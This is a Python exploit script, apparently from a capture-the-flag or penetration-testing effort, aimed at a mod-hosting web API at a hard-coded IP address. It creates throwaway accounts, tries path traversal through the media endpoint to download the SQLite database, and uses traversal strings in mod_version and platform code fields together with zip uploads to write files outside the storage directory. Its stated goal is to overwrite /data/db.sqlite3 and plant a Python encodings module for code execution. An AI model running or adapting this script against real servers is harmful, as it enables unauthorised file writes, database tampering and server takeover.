#!/usr/bin/env python3
"""
_t45_db_overwrite.py
Strategy: Overwrite /data/db.sqlite3 with a modified version that has
a Platform entry with code='lib/python3.11/encodings' (24 chars - bypassing DRF validation).

Steps:
1. Read current DB via /media/../../db.sqlite3? (not directly accessible)
   OR: get all existing data via API and reconstruct
2. Modify DB to add long platform code
3. Upload modified DB via zip-slip to /data/db.sqlite3
4. Use the long-code platform to upload cp437.py
"""
import requests, sys, io, zipfile, secrets, time, re, sqlite3, tempfile, os, shutil

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

# Step 1: Try to download DB via media endpoint
# The media endpoint: re_path(r'^media/(?P<path>.*)$', serve, ...)
# If /data/db.sqlite3 is at /media/../../db.sqlite3 - let's try
r_db = requests.get(f"{BASE}/media/../../db.sqlite3", timeout=15)
print(f"[*] GET /media/../../db.sqlite3 -> {r_db.status_code}")
if r_db.status_code == 200:
    print(f"    Got DB! size={len(r_db.content)}")
    db_bytes = r_db.content
else:
    # Try other paths
    for path in ["../db.sqlite3", "../../db.sqlite3", "../../../data/db.sqlite3"]:
        r2 = requests.get(f"{BASE}/media/{path}", timeout=15)
        print(f"  GET /media/{path} -> {r2.status_code}")
        if r2.status_code == 200 and b'SQLite' in r2.content[:20]:
            print(f"    Found DB! size={len(r2.content)}")
            db_bytes = r2.content
            break
    else:
        print("[-] Cannot download DB directly")
        db_bytes = None

# Step 2: Check if we can upload a file to /data/ directly
# storage_dir = /data/media/builds/mv/pc
# If mv='..', pc='..', storage_dir = /data/media/builds/../.. = /data/media
# If mv='../..', pc='..', storage_dir = /data/media/builds/../../.. = /data
# But pc='..' is 2 chars - valid!
tok1, _ = fresh()
pid_test = get_or_create_plat(tok1, "..", name="dotdot")
print(f"\n[*] Platform '..' -> id={pid_test}")

if pid_test:
    mid_test = requests.post(f"{BASE}/api/mods/", headers=H(tok1),
        json={"title":"z","mod_version":"../..","release_notes":"","is_enabled":True}, timeout=15).json().get("id")
    print(f"[*] Mod mod_version='../../' -> id={mid_test}")
    if mid_test:
        bid_test = requests.post(f"{BASE}/api/mods/{mid_test}/builds/", headers=H(tok1),
            json={"platform": pid_test}, timeout=15).json().get("id")
        print(f"[*] Build -> id={bid_test}")
        if bid_test:
            bio = io.BytesIO()
            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("canary_data_dir.txt", b"hello from /data/media/../..")
            bio.seek(0)
            r_upload = requests.post(f"{BASE}/api/mods/{mid_test}/builds/{bid_test}/upload/",
                headers=H(tok1), files={"zip_file": ("t.zip", bio, "application/zip")}, timeout=30)
            print(f"[*] Upload to /data/media (mv=../.., pc=..) -> {r_upload.status_code}")
            # Can we read it? /media/canary_data_dir.txt
            r_read = requests.get(f"{BASE}/media/canary_data_dir.txt", timeout=10)
            print(f"[*] GET /media/canary_data_dir.txt -> {r_read.status_code}", r_read.text[:50] if r_read.ok else "")

# Step 3: Try to overwrite /data/db.sqlite3
# storage_dir needs to be /data/
# mv='../../..' (7), pc='.' (1) -> /data/media/builds/../../.. / . = /data/media/../.
# That's /data/media and then . -> still /data/media :(
# Need ONE more level: mv='../../..', pc='..' -> /data/
print("\n[*] Testing /data/ write with mv=../../.., pc=..")
tok2, _ = fresh()
pid2 = get_or_create_plat(tok2, "dotdot2", name="dd2")
# Actually: mod_version='../../..' and platform_code='something'
# /data/media/builds + ../../.. = /data/media/ + ../../ = /data/ then + something -> /data/something
mid2 = requests.post(f"{BASE}/api/mods/", headers=H(tok2),
    json={"title":"z","mod_version":"../../..","release_notes":"","is_enabled":True}, timeout=15).json().get("id")
if mid2:
    bid2 = requests.post(f"{BASE}/api/mods/{mid2}/builds/", headers=H(tok2),
        json={"platform": pid2}, timeout=15).json().get("id")
    if bid2:
        bio2 = io.BytesIO()
        with zipfile.ZipFile(bio2, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("canary_in_data.txt", b"wrote to /data/dotdot2/")
        bio2.seek(0)
        r2 = requests.post(f"{BASE}/api/mods/{mid2}/builds/{bid2}/upload/",
            headers=H(tok2), files={"zip_file": ("t.zip", bio2, "application/zip")}, timeout=30)
        print(f"[*] Upload /data/dotdot2/ -> {r2.status_code}")
        # This would be /data/dotdot2/canary_in_data.txt
        # Not directly readable via /media/

# Step 4: The REAL attempt - /data/db.sqlite3 via mv='../../..' pc='.'
# But '.', when used as platform_code, creates dir '.' which is current dir
# storage_dir = /data/media/builds/../../.. / . = /data/media/.. = /data/ actually
# Let me verify:
from pathlib import PurePosixPath
base = PurePosixPath('/data/media/builds')
p = base / '../../..' / 'dotdot2'
print(f"\n[*] Path for mv=../../.. pc=dotdot2: {p}")
# This resolves to /data/media/builds/../../.. resolved = /data then /dotdot2
# Actually in Linux filesystem: /data/media/builds/../../../dotdot2 = /dotdot2 (one level above /data)
# /data/media/builds has 3 path components, so 3 ../ goes to /

print("Path math:")
import subprocess
# Can't run subprocess easily, but let's trace:
# /data/media/builds + ../../../ = /
# So mv='../../..' from /data/media/builds = / (3 levels up) NO!
# /data/media/builds = /data/media/builds (3 components)
# ../  = /data/media (goes to parent)
# ../../ = /data
# ../../../ = /  (3 dots from 3 components = root)
# So mv='../../..' + pc='dotdot2' -> storage_dir = / + dotdot2 = /dotdot2 (not /data/)

# For /data/:
# mv='..' + pc='..' -> /data/media/builds/../.. = /data/media
# mv='../..' + pc='..' -> /data/media/builds/../../../.. = /data (2+1=3 dots from builds, then 1 more = above /data)
# Hmm, need exactly 2 levels up from /data/media/builds = /data
# 2 levels up: builds->media is 1, media->data is 2
# So mv='..' + pc='' or mv='../..' + pc='' 
# But empty platform_code?

print("Checking /data/ path:")
p_data = base / '..' / '..'
print(f"  base/../../: {p_data}")
p_data2 = base / '../..'
print(f"  base/../..: {p_data2}")
# Both should be /data/media if we have only 2 dots

# For platform code '', let's try code='.'
p3 = base / '../..' / '.'
print(f"  base/../../. : {p3}")
# In filesystem: /data/media/builds/../../. = /data/media/../. = /data/. = /data/
